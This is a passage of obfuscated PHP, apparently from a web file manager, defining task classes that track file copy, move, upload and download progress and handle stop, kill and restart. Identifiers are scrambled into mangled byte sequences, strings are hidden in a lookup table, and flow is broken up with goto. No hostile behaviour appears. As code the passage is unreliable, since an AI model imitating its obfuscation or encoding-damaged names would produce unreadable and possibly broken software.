timeFloat(), $eÁ®Á²âóÃ[749] => 0, $eÁ®Á²âóÃ[1530] => 0, $eÁ®Á²âóÃ[1531] => 0, $eÁ®Á²âóÃ[1532] => 0, $eÁ®Á²âóÃ[714] => $eÁ®Á²âóÃ[1491]); goto f¶è¾ç÷ªš; A„·ù‚Êœ: $this->startAfter(); Hook::trigger($eÁ®Á²âóÃ[1537], $this->task); $this->task[$eÁ®Á²âóÃ[1530]] = timeFloat(); goto CÔ»Ï…ó’‹; CÔ»Ï…ó’‹: } public function end() { goto DéÕê¢µäñ; DéÕê¢µäñ: $dé½ö¤…ÛØ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->task) { return; } if ($this->task[$dé½ö¤…ÛØ[1530]]) { self::valueSet($this->task[$dé½ö¤…ÛØ[392]], !1); } goto C…ˆ†ª‹­ã; C…ˆ†ª‹­ã: $c‡¶¦‰šÈ = timeFloat() - $this->task[$dé½ö¤…ÛØ[750]]; self::log($dé½ö¤…ÛØ[1538] . $this->task[$dé½ö¤…ÛØ[392]] . $dé½ö¤…ÛØ[1539] . $c‡¶¦‰šÈ . $dé½ö¤…ÛØ[1540]); Hook::unbind($dé½ö¤…ÛØ[1493], array($this, $dé½ö¤…ÛØ[1534])); goto B¹Û³˜³ç; B¹Û³˜³ç: Hook::unbind($dé½ö¤…ÛØ[1535], array($this, $dé½ö¤…ÛØ[1536])); $this->endAfter(); $this->task = !1; goto B¡ÑŠô¿ùª; B¡ÑŠô¿ùª: } public function update($CÆİŞ•—Õí = 0, $E»ğ‡²Òçê = false) { goto D¡¼Ïó¯»–; Cì²Ğ‹ÎÉ: $A„ì¬¿œ‹ = self::get($B¤ƒìš§—[$EòµĞ¿ÛÂ[392]]); $f¶¼¿Š Œ– = $A„ì¬¿œ‹[$EòµĞ¿ÛÂ[714]]; if ($f¶¼¿Š Œ– == self::STATYS_KILL) { $aôøíŞîÑ® = array($EòµĞ¿ÛÂ[1541] => LNG($EòµĞ¿ÛÂ[1542]), $EòµĞ¿ÛÂ[1085] => !1); Cache::set($EòµĞ¿ÛÂ[1543] . $this->task[$EòµĞ¿ÛÂ[392]], $aôøíŞîÑ®, 30); $this->end(); die; } else { if ($f¶¼¿Š Œ– == self::STATYS_STOP) { $aÏñ‘¤ÍÜŸ = 2; $A„ì¬¿œ‹[$EòµĞ¿ÛÂ[1531]] += $aÏñ‘¤ÍÜŸ; self::valueSet($B¤ƒìš§—[$EòµĞ¿ÛÂ[392]], $A„ì¬¿œ‹); sleep($aÏñ‘¤ÍÜŸ); $this->update(); return; } } goto EÆË”„«ò’; D¡¼Ïó¯»–: $EòµĞ¿ÛÂ =& $_SERVER[¬ı§†‰ú˜¼]; $B¤ƒìš§— =& $this->task; if (!$B¤ƒìš§—) { return; } goto f˜à©„˜›±; EÆË”„«ò’: $B¤ƒìš§—[$EòµĞ¿ÛÂ[714]] = $f¶¼¿Š Œ– ? $f¶¼¿Š Œ– : $B¤ƒìš§—[$EòµĞ¿ÛÂ[714]]; $B¤ƒìš§—[$EòµĞ¿ÛÂ[1531]] = $A„ì¬¿œ‹[$EòµĞ¿ÛÂ[1531]] ? $A„ì¬¿œ‹[$EòµĞ¿ÛÂ[1531]] : 0; $B¤ƒìš§—[$EòµĞ¿ÛÂ[1530]] = timeFloat(); goto bœ²«ë½¦; bœ²«ë½¦: Hook::trigger($EòµĞ¿ÛÂ[1544], $B¤ƒìš§—); self::valueSet($B¤ƒìš§—[$EòµĞ¿ÛÂ[392]], $B¤ƒìš§—); goto b¨ÆÎÁÔí; bÔÜ×ÆäÖ™: $this->updateAfter(); $AƒÔÉÑ¨¥­ = 0.2; if (timeFloat() - $B¤ƒìš§—[$EòµĞ¿ÛÂ[1530]] < $AƒÔÉÑ¨¥­ && !$E»ğ‡²Òçê) { return; } goto Cì²Ğ‹ÎÉ; f˜à©„˜›±: $B¤ƒìš§—[$EòµĞ¿ÛÂ[1035]] += $CÆİŞ•—Õí; $B¤ƒìš§—[$EòµĞ¿ÛÂ[749]] = timeFloat(); if ($B¤ƒìš§—[$EòµĞ¿ÛÂ[1020]]) { if ($B¤ƒìš§—[$EòµĞ¿ÛÂ[1020]] < $B¤ƒìš§—[$EòµĞ¿ÛÂ[1035]]) { $B¤ƒìš§—[$EòµĞ¿ÛÂ[1020]] = $B¤ƒìš§—[$EòµĞ¿ÛÂ[1035]]; } $CÍ¿‡å”é¥ = timeFloat() - $B¤ƒìš§—[$EòµĞ¿ÛÂ[750]] - $B¤ƒìš§—[$EòµĞ¿ÛÂ[1531]]; $B¤ƒìš§—[$EòµĞ¿ÛÂ[1528]] = $B¤ƒìš§—[$EòµĞ¿ÛÂ[1035]] / $B¤ƒìš§—[$EòµĞ¿ÛÂ[1020]]; $B¤ƒìš§—[$EòµĞ¿ÛÂ[1529]] = $B¤ƒìš§—[$EòµĞ¿ÛÂ[1035]] / $CÍ¿‡å”é¥; if ($B¤ƒìš§—[$EòµĞ¿ÛÂ[1528]] > 0) { $B¤ƒìš§—[$EòµĞ¿ÛÂ[1532]] = $CÍ¿‡å”é¥ * (1 - $B¤ƒìš§—[$EòµĞ¿ÛÂ[1528]]) / $B¤ƒìš§—[$EòµĞ¿ÛÂ[1528]]; } $B¤ƒìš§—[$EòµĞ¿ÛÂ[1532]] = $B¤ƒìš§—[$EòµĞ¿ÛÂ[1532]] <= 0 ? 0 : $B¤ƒìš§—[$EòµĞ¿ÛÂ[1532]]; } goto bÔÜ×ÆäÖ™; b¨ÆÎÁÔí: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($e¿Ü—»¢±) { $B–„ÅÒ¼î =& $_SERVER[¬ı§†‰ú˜¼]; Cache::set($B–„ÅÒ¼î[1543] . $this->task[$B–„ÅÒ¼î[392]], $e¿Ü—»¢±, 60); return $e¿Ü—»¢±; } public static function get($FÖš¥°„ ¥) { return self::valueGet($FÖš¥°„ ¥); } public static function listData() { $AíĞ•«Éíõ = self::valueGet(); return array_sort_by($AíĞ•«Éíõ, $_SERVER[¬ı§†‰ú˜¼][750], !0); } public static function kill($FÂ”‡Í°ù³) { return self::changeStatus($FÂ”‡Í°ù³, self::STATYS_KILL); } public static function stop($DãİŞéø‰†) { return self::changeStatus($DãİŞéø‰†, self::STATYS_STOP); } public static function restart($aÆéÄƒ¥øÂ) { return self::changeStatus($aÆéÄƒ¥øÂ, self::STATYS_RUNNING); } public static function killAll() { $fïÎ™Š‘¨ =& $_SERVER[¬ı§†‰ú˜¼]; $eĞÒ¬Å¨ÔË = self::listData(); foreach ($eĞÒ¬Å¨ÔË as $aòÕŞİ”ª) { self::kill($aòÕŞİ”ª[$fïÎ™Š‘¨[392]]); } sleep(2); foreach ($eĞÒ¬Å¨ÔË as $aòÕŞİ”ª) { self::valueSet($aòÕŞİ”ª[$fïÎ™Š‘¨[392]], !1); } } private static function changeStatus($AÊ¢¿º“â, $d×‚–ˆôÎ™) { goto f ¨Ûáà–ê; b‰…ÜêÎ˜Œ: return !0; goto aõíí³âø¨; BÆ¹³Ôêƒå: $D™é·ÍÆÙ“[$DÀİîÃˆå†[714]] = $d×‚–ˆôÎ™; self::valueSet($AÊ¢¿º“â, $D™é·ÍÆÙ“); self::log($DÀİîÃˆå†[1545] . $D™é·ÍÆÙ“[$DÀİîÃˆå†[392]] . $DÀİîÃˆå†[1546] . $d×‚–ˆôÎ™); goto b‰…ÜêÎ˜Œ; f ¨Ûáà–ê: $DÀİîÃˆå† =& $_SERVER[¬ı§†‰ú˜¼]; $D™é·ÍÆÙ“ = self::valueGet($AÊ¢¿º“â); if (!$D™é·ÍÆÙ“) { return !1; } goto BÆ¹³Ôêƒå; aõíí³âø¨: } public static function valueGet($Eãô™¸‡ÓŒ = false) { $F»İ„ÛÀªõ =& $_SERVER[¬ı§†‰ú˜¼]; if ($Eãô™¸‡ÓŒ) { $bçƒÛ˜‹¼ = Model($F»İ„ÛÀªõ[423])->where(array($F»İ„ÛÀªõ[93] => $Eãô™¸‡ÓŒ, $F»İ„ÛÀªõ[29] => $F»İ„ÛÀªõ[1547]))->find(); return $bçƒÛ˜‹¼ ? json_decode($bçƒÛ˜‹¼[$F»İ„ÛÀªõ[371]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Fäòˆ¿ŠÈ‹ = false) { goto eÏÍÁ¢£›Á; AÀ‹†ì¡İ: $d†èñÔ„ÑŠ = Model($aÄİ›­¬±›[423])->where($D­–šÉ‘Œ)->select(); $d†èñÔ„ÑŠ = $d†èñÔ„ÑŠ ? $d†èñÔ„ÑŠ : array(); foreach ($d†èñÔ„ÑŠ as $bö«ğ¢¢× => $c¿°’®¡×Ö) { $d†èñÔ„ÑŠ[$bö«ğ¢¢×] = json_decode($c¿°’®¡×Ö[$aÄİ›­¬±›[371]], !0); } goto AÙ®‹Èí; eÏÍÁ¢£›Á: $aÄİ›­¬±› =& $_SERVER[¬ı§†‰ú˜¼]; $D­–šÉ‘Œ = array($aÄİ›­¬±›[29] => $aÄİ›­¬±›[1547]); if ($Fäòˆ¿ŠÈ‹) { $D­–šÉ‘Œ[$aÄİ›­¬±›[1527]] = $Fäòˆ¿ŠÈ‹; } goto AÀ‹†ì¡İ; AÙ®‹Èí: return $d†èñÔ„ÑŠ; goto aµ«¢Ÿ±ïˆ; aµ«¢Ÿ±ïˆ: } public static function valueSet($bÇ†—Ã‡øØ, $Aµ’™ÃáÁí) { goto F¯ŞË«·¾ª; FğµõˆàÒë: if (!$d­ğòÙõ©) { ob_start(); var_dump($Aµ’™ÃáÁí); $f¡¨§¸»Í‡ = ob_get_clean(); self::log($FªÏƒäÛ¤¤[1548] . json_encode_force($f¡¨§¸»Í‡)); } if (!$bÇ†—Ã‡øØ || !$Aµ’™ÃáÁí[$FªÏƒäÛ¤¤[392]]) { return !1; } $e”®ÓÅ”¤… = array($FªÏƒäÛ¤¤[29] => $FªÏƒäÛ¤¤[1547], $FªÏƒäÛ¤¤[1527] => USER_ID, $FªÏƒäÛ¤¤[93] => $bÇ†—Ã‡øØ, $FªÏƒäÛ¤¤[371] => $d­ğòÙõ©); goto BÀÜ™­¿Ü¡; F¯ŞË«·¾ª: $FªÏƒäÛ¤¤ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$Aµ’™ÃáÁí) { return Model($FªÏƒäÛ¤¤[423])->where(array($FªÏƒäÛ¤¤[93] => $bÇ†—Ã‡øØ, $FªÏƒäÛ¤¤[29] => $FªÏƒäÛ¤¤[1547]))->delete(); } $d­ğòÙõ© = json_encode($Aµ’™ÃáÁí); goto FğµõˆàÒë; BÀÜ™­¿Ü¡: Model($FªÏƒäÛ¤¤[423])->add($e”®ÓÅ”¤…, array(), !0); goto e³È¢¢ø°ã; e³È¢¢ø°ã: } public static function log($B¡¦¨²¯Å´) { if (!GLOBAL_DEBUG) { return; } write_log($B¡¦¨²¯Å´, $_SERVER[¬ı§†‰ú˜¼][1549]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto b¨ÇÒší; B°»öª³¬¥: Hook::bind($dùåäâàâ[1550], array($this, $dùåäâàâ[1551])); Hook::bind($dùåäâàâ[1109], array($this, $dùåäâàâ[1552])); Hook::bind($dùåäâàâ[1553], array($this, $dùåäâàâ[1554])); goto BÖ×¹¿¿†î; dø”Á´å¥’: $b¡ê¯†˜Ø[$dùåäâàâ[1568]] = LNG($dùåäâàâ[1569]); $b¡ê¯†˜Ø[$dùåäâàâ[1570]] = 0; $b¡ê¯†˜Ø[$dùåäâàâ[1571]] = 0; goto e¹–ĞŒÜ—; dª›à—ï•¥: Hook::bind($dùåäâàâ[538], array($this, $dùåäâàâ[1558])); Hook::bind($dùåäâàâ[540], array($this, $dùåäâàâ[1558])); Hook::bind($dùåäâàâ[542], array($this, $dùåäâàâ[1558])); goto Cİëöš©¨…; BÖ×¹¿¿†î: Hook::bind($dùåäâàâ[565], array($this, $dùåäâàâ[1555])); Hook::bind($dùåäâàâ[566], array($this, $dùåäâàâ[1556])); Hook::bind($dùåäâàâ[568], array($this, $dùåäâàâ[1557])); goto aÒìè³ì¾…; e¹–ĞŒÜ—: $b¡ê¯†˜Ø[$dùåäâàâ[1022]] = $dùåäâàâ[33]; $b¡ê¯†˜Ø[$dùåäâàâ[1572]] = $dùåäâàâ[33]; $b¡ê¯†˜Ø[$dùåäâàâ[1573]] = 0; goto EÛÂ­½¤õŒ; BÀ¼½¼Ê®: Hook::bind($dùåäâàâ[1562], array($this, $dùåäâàâ[1563])); Hook::bind($dùåäâàâ[1564], array($this, $dùåäâàâ[1565])); Hook::bind($dùåäâàâ[1566], array($this, $dùåäâàâ[1567])); goto dø”Á´å¥’; Cİëöš©¨…: Hook::bind($dùåäâàâ[1559], array($this, $dùåäâàâ[1560])); Hook::bind($dùåäâàâ[558], array($this, $dùåäâàâ[1561])); $this->sourceModelCopyFlag = !1; goto BÀ¼½¼Ê®; aÒìè³ì¾…: Hook::bind($dùåäâàâ[569], array($this, $dùåäâàâ[1557])); Hook::bind($dùåäâàâ[536], array($this, $dùåäâàâ[1558])); Hook::bind($dùåäâàâ[533], array($this, $dùåäâàâ[1558])); goto dª›à—ï•¥; b¨ÇÒší: $dùåäâàâ =& $_SERVER[¬ı§†‰ú˜¼]; $b¡ê¯†˜Ø =& $this->task; $this->sourceCopyFolder = !1; goto B°»öª³¬¥; EÛÂ­½¤õŒ: $b¡ê¯†˜Ø[$dùåäâàâ[1574]] = 0; $b¡ê¯†˜Ø[$dùåäâàâ[1575]] = 0; if (!$b¡ê¯†˜Ø[$dùåäâàâ[1431]]) { $b¡ê¯†˜Ø[$dùåäâàâ[1431]] = LNG($dùåäâàâ[1576]); } goto Eè´í½ãï; Eè´í½ãï: } protected function endAfter() { goto bªÏ‚ìÒŸø; FŒƒ¢éç‰: Hook::unbind($E„ì „Ï°’[568], array($this, $E„ì „Ï°’[1557])); Hook::unbind($E„ì „Ï°’[569], array($this, $E„ì „Ï°’[1557])); Hook::unbind($E„ì „Ï°’[536], array($this, $E„ì „Ï°’[1558])); goto d¼‹÷ÍÆá›; aáÜé¥²²×: Hook::unbind($E„ì „Ï°’[542], array($this, $E„ì „Ï°’[1558])); Hook::unbind($E„ì „Ï°’[1559], array($this, $E„ì „Ï°’[1560])); Hook::unbind($E„ì „Ï°’[558], array($this, $E„ì „Ï°’[1561])); goto Bôœ¾Îƒƒì; bÛ¿Ş¡Á: Hook::unbind($E„ì „Ï°’[1553], array($this, $E„ì „Ï°’[1554])); Hook::unbind($E„ì „Ï°’[565], array($this, $E„ì „Ï°’[1555])); Hook::unbind($E„ì „Ï°’[566], array($this, $E„ì „Ï°’[1556])); goto FŒƒ¢éç‰; bªÏ‚ìÒŸø: $E„ì „Ï°’ =& $_SERVER[¬ı§†‰ú˜¼]; Hook::unbind($E„ì „Ï°’[1550], array($this, $E„ì „Ï°’[1551])); Hook::unbind($E„ì „Ï°’[1109], array($this, $E„ì „Ï°’[1552])); goto bÛ¿Ş¡Á; d¼‹÷ÍÆá›: Hook::unbind($E„ì „Ï°’[533], array($this, $E„ì „Ï°’[1558])); Hook::unbind($E„ì „Ï°’[538], array($this, $E„ì „Ï°’[1558])); Hook::unbind($E„ì „Ï°’[540], array($this, $E„ì „Ï°’[1558])); goto aáÜé¥²²×; Bôœ¾Îƒƒì: Hook::unbind($E„ì „Ï°’[1562], array($this, $E„ì „Ï°’[1563])); Hook::unbind($E„ì „Ï°’[1564], array($this, $E„ì „Ï°’[1565])); Hook::unbind($E„ì „Ï°’[1566], array($this, $E„ì „Ï°’[1567])); goto C²Íé©áŒ; C²Íé©áŒ: } public function copyMoveStart($bé¬Šù¼Ç¤, $Aä½áÆî, $D•Í³º…, $eµšÃª½˜®) { goto D…¤‚Á¿¤; Døºø™Á: if (substr($Aä½áÆî, 0, strlen($e³Í‚¤ì¸ğ)) == $e³Í‚¤ì¸ğ) { return; } if (substr($eµšÃª½˜®, 0, strlen($e³Í‚¤ì¸ğ)) == $e³Í‚¤ì¸ğ) { return; } $f¼Ì¥­˜‚ó =& $this->task; goto dºôä ¸…; dºôä ¸…: $f¼Ì¥­˜‚ó[$CÖ«²Ø°³[1578]] = KodIO::transferType($bé¬Šù¼Ç¤, $D•Í³º…); $this->update(); goto dÕèğäîÃÂ; D…¤‚Á¿¤: $CÖ«²Ø°³ =& $_SERVER[¬ı§†‰ú˜¼]; self::log($CÖ«²Ø°³[1577] . $Aä½áÆî . $CÖ«²Ø°³[67] . $eµšÃª½˜®); $e³Í‚¤ì¸ğ = rtrim(TEMP_FILES, $CÖ«²Ø°³[8]); goto Døºø™Á; dÕèğäîÃÂ: } public function updateAfter() { goto B™õ‹ïºŠ; Dè­ÏÄÏœ­: $bçÓäˆàª[$Eİ°¾ïÖ¹[1528]] = $bçÓäˆàª[$Eİ°¾ïÖ¹[1575]] / $bçÓäˆàª[$Eİ°¾ïÖ¹[724]]; if ($bçÓäˆàª[$Eİ°¾ïÖ¹[1528]] > 0) { $FÆÉ¢˜»˜Å = timeFloat() - $bçÓäˆàª[$Eİ°¾ïÖ¹[750]] - $bçÓäˆàª[$Eİ°¾ïÖ¹[1531]]; $bçÓäˆàª[$Eİ°¾ïÖ¹[1532]] = $FÆÉ¢˜»˜Å * (1 - $bçÓäˆàª[$Eİ°¾ïÖ¹[1528]]) / $bçÓäˆàª[$Eİ°¾ïÖ¹[1528]]; } goto Aä×˜Âù‹¢; A»‹á§´ö: if ($this->sourceModelCopyFlag) { return; } if ($bçÓäˆàª[$Eİ°¾ïÖ¹[1578]] == $Eİ°¾ïÖ¹[1181]) { return; } if ($bçÓäˆàª[$Eİ°¾ïÖ¹[1578]] == $Eİ°¾ïÖ¹[1093] || $bçÓäˆàª[$Eİ°¾ïÖ¹[1578]] == $Eİ°¾ïÖ¹[107]) { if ($bçÓäˆàª[$Eİ°¾ïÖ¹[1572]]) { $bçÓäˆàª[$Eİ°¾ïÖ¹[1575]] = $bçÓäˆàª[$Eİ°¾ïÖ¹[1574]] + $bçÓäˆàª[$Eİ°¾ïÖ¹[1571]]; } } else { if ($bçÓäˆàª[$Eİ°¾ïÖ¹[1578]] == $Eİ°¾ïÖ¹[1182]) { if ($bçÓäˆàª[$Eİ°¾ïÖ¹[1572]] == $Eİ°¾ïÖ¹[1093]) { $bçÓäˆàª[$Eİ°¾ïÖ¹[1575]] = $bçÓäˆàª[$Eİ°¾ïÖ¹[1574]] + $bçÓäˆàª[$Eİ°¾ïÖ¹[1571]] * 0.5; } else { if ($bçÓäˆàª[$Eİ°¾ïÖ¹[1572]] == $Eİ°¾ïÖ¹[107]) { $bçÓäˆàª[$Eİ°¾ïÖ¹[1575]] = $bçÓäˆàª[$Eİ°¾ïÖ¹[1574]] + $bçÓäˆàª[$Eİ°¾ïÖ¹[1570]] * 0.5 + $bçÓäˆàª[$Eİ°¾ïÖ¹[1571]] * 0.5; } } } } goto Dè­ÏÄÏœ­; B™õ‹ïºŠ: $Eİ°¾ïÖ¹ =& $_SERVER[¬ı§†‰ú˜¼]; $bçÓäˆàª =& $this->task; if (!$bçÓäˆàª[$Eİ°¾ïÖ¹[724]]) { return; } goto A»‹á§´ö; Aä×˜Âù‹¢: } public function addPath($dôÔ•´´—) { goto C¦ñ×êØì; E©§É¬İÜ: if ($AŞ´÷ÜÇÌ’[$c¥æºã‹­Ù[29]] == $c¥æºã‹­Ù[192]) { $BÇñ­å³âÈ[$c¥æºã‹­Ù[1020]] += 1; } else { $BÇñ­å³âÈ[$c¥æºã‹­Ù[1020]] += $AŞ´÷ÜÇÌ’[$c¥æºã‹­Ù[81]][$c¥æºã‹­Ù[79]]; if ($AŞ´÷ÜÇÌ’[$c¥æºã‹­Ù[394]]) { $BÇñ­å³âÈ[$c¥æºã‹­Ù[1020]] += $AŞ´÷ÜÇÌ’[$c¥æºã‹­Ù[81]][$c¥æºã‹­Ù[80]] + 1; } } $BÇñ­å³âÈ[$c¥æºã‹­Ù[724]] += $AŞ´÷ÜÇÌ’[$c¥æºã‹­Ù[78]]; $this->update(); goto aÌ÷Üïİ÷ ; CÍ¤×²Şù: $AŞ´÷ÜÇÌ’ = IO::infoWithChildren($dôÔ•´´—); $C‡†“ŞÂÀ = $BÇñ­å³âÈ[$c¥æºã‹­Ù[1579]] ? $BÇñ­å³âÈ[$c¥æºã‹­Ù[1579]][$c¥æºã‹­Ù[1580]] : 0; $BÇñ­å³âÈ[$c¥æºã‹­Ù[1579]] = array($c¥æºã‹­Ù[1580] => $C‡†“ŞÂÀ + 1, $c¥æºã‹­Ù[411] => $AŞ´÷ÜÇÌ’[$c¥æºã‹­Ù[28]], $c¥æºã‹­Ù[76] => $AŞ´÷ÜÇÌ’[$c¥æºã‹­Ù[76]], $c¥æºã‹­Ù[493] => $AŞ´÷ÜÇÌ’[$c¥æºã‹­Ù[493]] ? $AŞ´÷ÜÇÌ’[$c¥æºã‹­Ù[493]] : $AŞ´÷ÜÇÌ’[$c¥æºã‹­Ù[76]]); goto E©§É¬İÜ; C¦ñ×êØì: $c¥æºã‹­Ù =& $_SERVER[¬ı§†‰ú˜¼]; if (!$dôÔ•´´—) { return; } $BÇñ­å³âÈ =& $this->task; goto CÍ¤×²Şù; aÌ÷Üïİ÷ : } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($F°×ä§Ä‚³) { $EÔ°òÙÅ¦ =& $_SERVER[¬ı§†‰ú˜¼]; $Fø©¸‹î°ë =& $this->task; $Fø©¸‹î°ë[$EÔ°òÙÅ¦[1568]] = $F°×ä§Ä‚³[$EÔ°òÙÅ¦[28]]; $Fø©¸‹î°ë[$EÔ°òÙÅ¦[1022]] = $F°×ä§Ä‚³[$EÔ°òÙÅ¦[28]]; $this->update(); } public function copyFileStart($eçŒ°™˜ôÏ, $FöĞ®Ş‡³Ì, $fÁÑ¯Û–å, $CŠ¶ÁĞ­, $b§‹ŠğÁ¡, $B§²‹‰Â–¡) { goto Aù¡÷¼¬ãÜ; bï”öŠÅî: $fÏŒ‹ä«ƒ²[$DƒÛ‰è’Â÷[1568]] = $b ¾ˆÏ­ˆÜ; $fÏŒ‹ä«ƒ²[$DƒÛ‰è’Â÷[1570]] = (int) $eçŒ°™˜ôÏ->size($FöĞ®Ş‡³Ì); $fÏŒ‹ä«ƒ²[$DƒÛ‰è’Â÷[1571]] = 0; goto aÚ†­Ûí‡Ê; Aù¡÷¼¬ãÜ: $DƒÛ‰è’Â÷ =& $_SERVER[¬ı§†‰ú˜¼]; $b ¾ˆÏ­ˆÜ = $b§‹ŠğÁ¡; if ($b ¾ˆÏ­ˆÜ == $GLOBALS[$DƒÛ‰è’Â÷[1581]]) { $b ¾ˆÏ­ˆÜ = $GLOBALS[$DƒÛ‰è’Â÷[1582]]; } goto E¦»Š°óİ; E¦»Š°óİ: $GLOBALS[$DƒÛ‰è’Â÷[1582]] = $b§‹ŠğÁ¡; $GLOBALS[$DƒÛ‰è’Â÷[1581]] = $B§²‹‰Â–¡; $fÏŒ‹ä«ƒ² =& $this->task; goto bï”öŠÅî; aÚ†­Ûí‡Ê: $fÏŒ‹ä«ƒ²[$DƒÛ‰è’Â÷[1022]] = $DƒÛ‰è’Â÷[33]; $fÏŒ‹ä«ƒ²[$DƒÛ‰è’Â÷[1572]] = $DƒÛ‰è’Â÷[33]; $fÏŒ‹ä«ƒ²[$DƒÛ‰è’Â÷[1573]] = 0; goto FéÅÔîˆõ‹; FéÅÔîˆõ‹: $this->update(); goto Dî‘¬õ†‹; Dî‘¬õ†‹: } public function copyFileEnd($Dßáİ…ö, $eŞ£×ã“˜Ó, $AØ™ï›â, $bÏ‘´È„ËÌ, $EÆ’ò‹–™, $EÑ‰‹„ö¬) { $cæêÕùî­ß =& $_SERVER[¬ı§†‰ú˜¼]; $aç·ÆµººÜ =& $this->task; $aç·ÆµººÜ[$cæêÕùî­ß[1571]] = $aç·ÆµººÜ[$cæêÕùî­ß[1570]]; $aç·ÆµººÜ[$cæêÕùî­ß[1572]] = $cæêÕùî­ß[33]; if ($EÆ’ò‹–™ == $aç·ÆµººÜ[$cæêÕùî­ß[1568]]) { $aç·ÆµººÜ[$cæêÕùî­ß[1574]] += $aç·ÆµººÜ[$cæêÕùî­ß[1570]]; $aç·ÆµººÜ[$cæêÕùî­ß[1575]] = $aç·ÆµººÜ[$cæêÕùî­ß[1574]]; $this->update(1); } else { $this->update(); $aç·ÆµººÜ[$cæêÕùî­ß[1571]] = 0; } self::log($cæêÕùî­ß[1583] . $eŞ£×ã“˜Ó . $cæêÕùî­ß[67] . $bÏ‘´È„ËÌ . $cæêÕùî­ß[228] . $EÆ’ò‹–™ . $cæêÕùî­ß[1584] . $aç·ÆµººÜ[$cæêÕùî­ß[1568]]); } public function updateFileEnd($Eä³î¸°³ß, $AòÉ©„“Ğ) { goto bàëñŞ«ï…; FÑÓ‡†õË™: $this->update(1); self::log($f†‘»¼”©É[1585] . $Eä³î¸°³ß); goto d¤í›¶ø½; bàëñŞ«ï…: $f†‘»¼”©É =& $_SERVER[¬ı§†‰ú˜¼]; $b…Ö¯‹ºŠÖ =& $this->task; $b…Ö¯‹ºŠÖ[$f†‘»¼”©É[1568]] = $Eä³î¸°³ß; goto aÅà†‚Íôµ; aÅà†‚Íôµ: $b…Ö¯‹ºŠÖ[$f†‘»¼”©É[1570]] = $AòÉ©„“Ğ; $b…Ö¯‹ºŠÖ[$f†‘»¼”©É[1574]] += $AòÉ©„“Ğ; $b…Ö¯‹ºŠÖ[$f†‘»¼”©É[1575]] = $b…Ö¯‹ºŠÖ[$f†‘»¼”©É[1574]]; goto FÑÓ‡†õË™; d¤í›¶ø½: } public function sourceModelCopy($cŠãê“Ğóƒ) { goto e§Ì†ŠÍÅ÷; a¸Õµ’†Šå: $c£›¢…ä—î =& $this->task; $this->sourceModelCopyFlag = !0; $B¤å´Œ†ÉÏ = 0; goto céÆìŠáë¬; céÆìŠáë¬: switch ($BÌ©Õ‚Šó‰) { case $dŸ»ó¯åë™[534]: $B¤å´Œ†ÉÏ = 1; break; case $dŸ»ó¯åë™[537]: $c£›¢…ä—î[$dŸ»ó¯åë™[1568]] = $B¿”–¼¦¾ˆ[$dŸ»ó¯åë™[28]]; break; case $dŸ»ó¯åë™[539]: $B¤å´Œ†ÉÏ = intval($cŠãê“Ğóƒ[$dŸ»ó¯åë™[376]] * 0.4); break; case $dŸ»ó¯åë™[541]: $B¤å´Œ†ÉÏ = intval($cŠãê“Ğóƒ[$dŸ»ó¯åë™[376]] * 0.2); break; case $dŸ»ó¯åë™[543]: $B¤å´Œ†ÉÏ = intval($cŠãê“Ğóƒ[$dŸ»ó¯åë™[376]] * 0.4); break; } $this->update($B¤å´Œ†ÉÏ); $this->sourceModelCopyFlag = !1; goto d¦á¤íŸ¶ƒ; e§Ì†ŠÍÅ÷: $dŸ»ó¯åë™ =& $_SERVER[¬ı§†‰ú˜¼]; $BÌ©Õ‚Šó‰ = $cŠãê“Ğóƒ[0]; $B¿”–¼¦¾ˆ = $cŠãê“Ğóƒ[1]; goto a¸Õµ’†Šå; d¦á¤íŸ¶ƒ: } public function sourceRemove($b¦¡”„Ë¥È, $CÖ»²ˆ—ƒ) { $Eá·ˆÁøÌÂ =& $_SERVER[¬ı§†‰ú˜¼]; $this->sourceModelCopyFlag = !0; $C’ãÇ“Ñ²å = 1; if (isset($b¦¡”„Ë¥È[$Eá·ˆÁøÌÂ[81]])) { $C’ãÇ“Ñ²å = $b¦¡”„Ë¥È[$Eá·ˆÁøÌÂ[81]][$Eá·ˆÁøÌÂ[79]] + $b¦¡”„Ë¥È[$Eá·ˆÁøÌÂ[81]][$Eá·ˆÁøÌÂ[80]] + 1; } $this->update($C’ãÇ“Ñ²å); $this->sourceModelCopyFlag = !1; } public function sourceMove($cŸÕ…µ·Ô¡) { $this->sourceRemove($cŸÕ…µ·Ô¡, !1); } public function curlProgress($f—ù‘çšùä, $CŒïîÉò, $cä‹âæßËï, $E‘â¿²Û‘ˆ, $DâŸÅªÏ‹æ) { $aÙ©ç‡˜Ş =& $_SERVER[¬ı§†‰ú˜¼]; $EÎİŠ‹°Ï¾ =& $this->task; if ($DâŸÅªÏ‹æ > 0) { $EÎİŠ‹°Ï¾[$aÙ©ç‡˜Ş[1022]] = $aÙ©ç‡˜Ş[1586]; $EÎİŠ‹°Ï¾[$aÙ©ç‡˜Ş[1572]] = $aÙ©ç‡˜Ş[107]; if ($EÎİŠ‹°Ï¾[$aÙ©ç‡˜Ş[1570]]) { $EÎİŠ‹°Ï¾[$aÙ©ç‡˜Ş[1571]] = $DâŸÅªÏ‹æ; } if ($EÎİŠ‹°Ï¾[$aÙ©ç‡˜Ş[1573]]) { $EÎİŠ‹°Ï¾[$aÙ©ç‡˜Ş[1571]] = $DâŸÅªÏ‹æ + $EÎİŠ‹°Ï¾[$aÙ©ç‡˜Ş[1573]]; } } else { if ($cä‹âæßËï > 0) { if ($EÎİŠ‹°Ï¾[$aÙ©ç‡˜Ş[1570]] == $CŒïîÉò) { $EÎİŠ‹°Ï¾[$aÙ©ç‡˜Ş[1571]] = $cä‹âæßËï; $EÎİŠ‹°Ï¾[$aÙ©ç‡˜Ş[1022]] = $aÙ©ç‡˜Ş[1587]; $EÎİŠ‹°Ï¾[$aÙ©ç‡˜Ş[1572]] = $aÙ©ç‡˜Ş[1093]; } } } $this->update(); } public function curlProgressStart($A±Â—¦éŠ) { } public function curlProgressEnd($dŸƒÈ¤¯³–) { goto bø®ª´Ëã; bø®ª´Ëã: $Fñ“Ë¦›¡Ø =& $_SERVER[¬ı§†‰ú˜¼]; $F‘Äà¯„“â =& $this->task; $dê–Œª¿øÏ = 